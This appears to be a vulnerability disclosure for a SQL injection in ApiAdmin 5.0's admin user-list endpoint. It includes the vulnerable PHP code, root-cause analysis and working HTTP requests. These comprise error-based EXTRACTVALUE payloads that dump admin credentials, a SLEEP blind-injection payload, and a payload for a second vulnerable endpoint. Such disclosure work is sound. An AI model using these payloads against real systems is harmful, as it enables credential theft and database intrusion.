# ApiAdmin 5.0 SQL Injection Vulnerability Report

## Introduction to Vulnerabilities

The admin user-list endpoint `GET /admin/User/getUsers` in ApiAdmin (ThinkPHP 6-based API management platform) concatenates the `gid` parameter into a raw `find_in_set()` expression which is executed through `Db::query()` without parameter binding. Any **logged-in admin user** can run SQL: error-based `EXTRACTVALUE` dumps the full `admin_user` credentials (username / password hash / nickname) through the 500 error page, and time-based `SLEEP` blind injection works regardless of `APP_DEBUG`.

## Affected Versions

- ApiAdmin `<= 5.0` (ThinkPHP 6.0, `config/apiadmin.php` `APP_VERSION` = 5.0; last release 2020)

## Utilize conditions

1. Any back-end account with admin panel access (login is username/password based, no extra permission points needed for a super admin; low-privilege admins with this menu inherit the flaw)

### Step 1 — Login

```
POST /admin/Login/index HTTP/1.1
Host: 127.0.0.1:8003
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

username=root&password=sGPApShi
```

Response (`apiAuth` is the token carried as `Api-Auth` header on all later requests):

![image-20260826155513222](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826155513222.9gxb7o9moe.webp)

```json
{"code":1,"msg":"登录成功","data":{"id":1,"username":"root","nickname":"root",
 "password":"21f6213c2045a8a7fcbb155b6e83afbd","apiAuth":"9e89c000b0f0d057f79b63f0621c52b3", ...}}
```

### Step 2 — Baseline

```
GET /admin/User/getUsers?gid=1&size=10&page=1 HTTP/1.1
Host: 127.0.0.1:8003
Api-Auth: de7a6434e559c53efa5b50b9cbe9b2c9
X-Requested-With: XMLHttpRequest

HTTP/1.1 200 OK
{"code":1,"msg":"操作成功","data":{"list":[{...root...}],"count":1}}
```

![image-20260826155621177](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826155621177.icuzfs3m4.webp)

### Step 3 — Error-based injection: dump admin credentials

Payload closes the `find_in_set('...')` string and evaluates `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ...)))` for each joined row; the XPATH error echoes the sub-query result on the 500 error page (the payload starts with `'1' AND` because MySQL short-circuits `'1' OR <expr>` and would skip the injection):

```
GET /admin/User/getUsers?gid=1%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28SELECT%20CONCAT%28username%2C0x3a%2Cpassword%29%20FROM%20admin_user%20WHERE%20id%3D1%29%29%29%20AND%20%271%27%3D%271&size=10&page=1 HTTP/1.1
Api-Auth: de7a6434e559c53efa5b50b9cbe9b2c9
```

Response:

```
HTTP/1.1 500
<h1>SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~root:21f6213c2045a8a7fcbb155b6e'</h1>
```

![image-20260826155713881](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826155713881.5flbta66fw.webp)

### Step 4 — Time-based blind confirmation

```
GET /admin/User/getUsers?gid=1%27%20AND%20SLEEP%282%29%20AND%20%271%27%3D%271&size=10&page=1 HTTP/1.1
```

Response: **2.06s** (baseline ~0.1s) — blind injection holds regardless of `APP_DEBUG`.

![image-20260826155744847](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826155744847.2a5tucc18e.webp)

## Root Cause Analysis

`app/controller/admin/User.php:114-127` — `gid` taken raw from GET and concatenated into a raw SQL string executed by `Db::query()`:

```php
public function getUsers() {
    $limit = $this->request->get('size', config('apiadmin.ADMIN_LIST_DEFAULT'));
    $page  = $this->request->get('page', 1);
    $gid   = $this->request->get('gid', 0);
    ...
    $totalNum = (new AdminAuthGroupAccess())->where('find_in_set("' . $gid . '", `group_id`)')->count();
    $start = $limit * ($page - 1);
    $sql = "SELECT au.* FROM admin_user as au LEFT JOIN admin_auth_group_access as aaga " .
           " ON aaga.`uid` = au.`id` WHERE find_in_set('{$gid}', aaga.`group_id`) " .   // <-- user-controlled gid
           " ORDER BY au.create_time DESC LIMIT {$start}, {$limit}";
    $userInfo = Db::query($sql);                                                        // <-- raw execution
    ...
}
```

![image-20260827093558916](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260827093558916.32ipc2sx2q.webp)

The vulnerable line is `User.php:125-127`: `{$gid}` is interpolated into `find_in_set('...')` inside a hand-built SQL string passed to `Db::query()` with no escaping, no whitelist and no `where()` parameter binding. The first query (`User.php:122`) also embeds `$gid` in double quotes but harmlessly (the payload is treated as string data there).

Notes on technique:

- **MySQL short-circuit**: `find_in_set('1' OR <payload>, ...)` skips `<payload>` because `'1'` is truthy — the payload must force evaluation with `'1' AND <expr>` / `"" OR <expr>`.
- **Row requirement**: the injection expression only runs on scanned rows, so `admin_auth_group_access` must contain data (always true in production; the `LEFT JOIN` also guarantees rows from `admin_user`).
- The `count()` at `User.php:122` runs before the raw query, so a plain `UNION SELECT` cannot be used (the payload cannot escape the `WHERE` expression into a UNION context) — error-based and time-based are the effective vectors.
- **Related flaw (not reported here)**: `app/controller/admin/Auth.php:164` `Auth::del()` has the same pattern (`find_in_set("'.$id.'", group_id)`), also exploitable with `id=" OR EXTRACTVALUE(...) OR "`; only the `getUsers` variant is reported.
